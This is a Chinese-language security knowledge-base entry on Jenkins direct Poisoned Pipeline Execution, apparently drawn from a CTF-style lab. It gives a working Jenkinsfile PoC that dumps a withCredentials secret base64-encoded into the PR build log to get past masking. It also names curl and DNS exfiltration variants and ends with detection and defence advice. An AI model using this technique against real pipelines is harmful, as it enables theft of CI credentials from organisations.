---
id: cloud-cicd-jenkins-direct-ppe-jenkinsfile-credential-exfil
title: Jenkins 直接 PPE：PR 分支修改 Jenkinsfile 借 withCredentials 窃取构建凭据
type: scenario
domain: cloud
path: cloud/ci-cd
technique: jenkins-direct-ppe-jenkinsfile-credential-exfil
aliases:
- Jenkins PPE
- Poisoned Pipeline Execution
- 投毒流水线
- Jenkinsfile 注入
- withCredentials 泄露
- PR 构建凭据窃取
tags:
- cicd
- jenkins
- ppe
- jenkinsfile
- credentials
- exfiltration
- pr
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:04+08:00'
  notes: 已对照原文与图01/02核对 Jenkinsfile 注入 stage、PR 触发与 flag1 base64 控制台输出（ZmxhZzE6...）；日志掩码可用编码绕过的细节为机制说明，原文未展开。
---

## 一句话结论

当 Jenkins 的 multibranch/pull request 任务会直接使用 PR 分支里的 `Jenkinsfile` 构建，且攻击者能向仓库推送分支或提 PR 时，只需在 `Jenkinsfile` 中增加一个调用 `withCredentials` 的 stage，把凭据写入环境变量并 `base64` 后输出到构建日志，即可在 CI agent 上借构建身份窃取流水线凭据——不需要任何 Jenkins 漏洞。

## 原理

- **Jenkinsfile 就是会被执行的代码**：流水线定义随仓库版本走，PR 分支的 `Jenkinsfile` 会在该 PR 的构建中生效；修改它等于让 CI 以构建身份执行攻击者的 Groovy/sh。
- **凭据以环境变量注入**：`withCredentials([string(credentialsId: 'flag1', variable: 'flag1')])` 会把 Jenkins 凭据绑定到 `flag1` 环境变量供 `sh` 使用；攻击者的 stage 直接 `echo "flag1:".$flag1 | base64` 即可读出。
- **日志掩码可被编码绕过**：Jenkins 的凭据掩码按已知明文子串替换，`base64`（或分段/反转）后不再是原串，通常可直接显示在控制台。
- **前提是构建信任边界被打破**：只要 PR 构建使用与主干相同的 agent、相同的凭据作用域，攻击者就能借用这些凭据；这正是 OWASP CI/CD Top 10 中的 PPE（Poisoned Pipeline Execution）。

## 触发条件

- 攻击者对目标仓库有写权限，或能 fork 后提 PR，且 Jenkins 对 PR/分支执行其 `Jenkinsfile`。
- 流水线在构建中通过 `withCredentials` 或环境变量使用凭据（部署 token、包仓库 token、flag 等）。
- 凭据 ID/变量名可从 Jenkinsfile、历史构建、错误信息或公开配置中获得。
- 构建日志对攻击者可见（PR 构建通常可见）。

## 利用步骤

1. clone 仓库并新建分支：`git checkout -b challenge1`，修改 `Jenkinsfile` 增加恶意 stage：
   ```groovy
   stage('getflag') {
       steps {
           withCredentials([string(credentialsId: 'flag1', variable: 'flag1')]) {
               sh 'echo "flag1:".$flag1 | base64'
           }
       }
   }
   ```
2. `git add * && git commit -m commit && git push -u origin challenge1`，在 Gitea/GitLab 上创建到 main 的 PR。
3. Jenkins 触发该 PR 的构建，打开 `.../job/<job>/view/change-requests/job/PR-x/console` 查看控制台输出。
4. 取 `flag1:` 后的 base64 串解码即得凭据；也可换成 `env`、`curl`、DNS 外带等方式。

## PoC

```groovy
pipeline {
    agent any
    stages {
        stage('getflag') {
            steps {
                withCredentials([string(credentialsId: 'flag1', variable: 'flag1')]) {
                    sh 'echo "flag1:".$flag1 | base64'
                }
            }
        }
        stage ('Unit Tests') { steps { sh "pytest" } }
    }
}
```

```bash
git checkout -b challenge1
git add *
git commit -m "commit"
git push -u origin challenge1
```

原文实测在 PR 构建控制台得到 `ZmxhZzE6...` 形式的 base64 并解出 flag1。

## 变体与关联

- **凭据类型变体**：`usernamePassword`（取 `$USERNAME/$PASSWORD`）、`sshUserPrivateKey`（取 `$KEY`/文件）、secret file、云厂商凭据；都能用同样方式读取。
- **外带变体**：`base64` 直接进日志、分段输出绕过掩码、`curl`/`wget` 外带、DNS 外带。
- **入口变体**：除 PR 外，只要能让流水线执行攻击者控制的 `Jenkinsfile`（如自由分支构建、共享库覆盖）即可。
- **同族**：[[cloud-cicd-jenkins-indirect-ppe-build-script-makefile]]（间接 PPE）、[[cloud-cicd-jenkins-public-ppe-fork-pr-token-repo-takeover]]（公开 PPE 后接管仓库）。

## 检测与防御

- **不可信 PR 不执行带生产凭据的流水线**：为 PR 构建使用独立 job、隔离 agent 和只读/无凭据作用域；生产凭据仅在受保护分支/受信任事件中使用。
- **Jenkins 配置**：multibranch 的 fork PR "Trust" 策略不要设为 Everyone；使用 Jenkins 的凭据绑定/文件夹级凭据隔离；限制 `withCredentials` 可用范围。
- **代码审查**：对 `Jenkinsfile`、共享库和 CI 配置做 CODEOWNERS/强制审批；保护分支禁止未审查变更。
- **日志与检测**：审计 PR 构建日志中的长 base64 串、`withCredentials` 后的异常输出、对构建机的异常外连；对凭据使用做最小权限和定期轮换。
- **凭据最小化**：部署 token/包仓库 token 不应具备超出构建所需权限；一旦泄露可快速吊销。
